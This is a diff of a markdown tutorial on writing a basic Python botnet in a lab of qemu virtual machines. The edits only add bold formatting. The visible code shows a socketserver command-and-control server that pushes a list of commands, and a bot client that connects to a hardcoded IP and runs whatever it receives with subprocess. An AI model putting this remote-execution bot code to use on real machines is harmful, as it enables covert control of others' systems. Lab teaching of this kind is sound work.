@@ -25,7 +25,7 @@ For my part I have 3 virtual machines under qemu which are in a LAN under the su
 When implementing the CnC (command and control server) for our botnet, we use the **socketserver.TCPServer()** class to manage multiple connections. Once a bot connects, its IP address is displayed, followed by the result of the runned command.  
 
 First we import the __socketserver__ library from python.
-Then we create the BotHandler class which will create a new instance each time a host connects to the tcp server: `tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`.  
+Then we create the BotHandler class which will create a new instance each time a host connects to the tcp server: **`tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`**.  
 ```python
 import socketserver
 
@@ -60,10 +60,10 @@ for i in self.cmdlist:
         self.request.sendall('end'.encode())
         pass
 ```
-Once the scrolling of the loop is finished, we send an __'end'__ message to end with the bot: `self.request.sendall('end'.encode())` .  
+Once the scrolling of the loop is finished, we send an __'end'__ message to end with the bot: **`self.request.sendall('end'.encode())`** .  
 
-Inside the main we just create a TCP server: `tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`  
-Then we put the server in listening mode: `tcp server.serve_forever()` .  
+Inside the main we just create a TCP server: **`tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`**  
+Then we put the server in listening mode: **`tcp server.serve_forever()`** .  
 ```python
 if __name__=='__main__':
     HOST,PORT='',8000
@@ -124,7 +124,7 @@ import socket
 import subprocess
 ```  
 
-The `botclient()` function creates a tcp socket and connects to the server:
+The **`botclient()`** function creates a tcp socket and connects to the server:
 ```python  
 def botclient():
     HOST = '192.168.100.152'#replace with the proper ip 
@@ -138,7 +138,7 @@ def botclient():
     data = s.recv(1024).decode()
 ```  
 
-As long as the received packet does not come with an __'end'__ message, we execute the contents of the received packet: `message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)` .
+As long as the received packet does not come with an __'end'__ message, we execute the contents of the received packet: **`message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)`** .
 'subprocess.run(['cmd','args'],stdout)' the function take a list as argument .  
 ```python
 while data != 'end':
